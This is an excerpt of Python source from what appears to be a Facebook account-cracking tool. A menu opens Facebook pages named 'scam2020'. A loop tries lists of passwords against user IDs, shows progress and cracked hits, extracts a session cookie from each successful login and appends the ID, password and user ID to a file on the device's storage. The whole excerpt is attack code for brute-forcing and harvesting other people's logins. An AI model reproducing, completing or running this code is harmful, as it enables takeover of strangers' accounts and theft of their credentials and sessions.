...
def Main():
	...
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/scam2020');time.sleep(1)
		fb()
	if opt in ["D","4"]:
		os.system('xdg-open https://facebook.com/scam2020/');time.sleep(1)
		group()
	if opt in ["0","0"]:
		exit()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mSecrching\033[1;90m] <> \033[1;96m%s/%s\033[1;90m <> \033[1;90m[\033[1;92mMOOD:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            #	botok(uid,ps)
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [MOOD] '+cid+' | '+ps+'\33[0;92m')
                #print(f'\r\033[1;92m=[💉]=COOKIE : '+coki)
                cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/MOOD-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
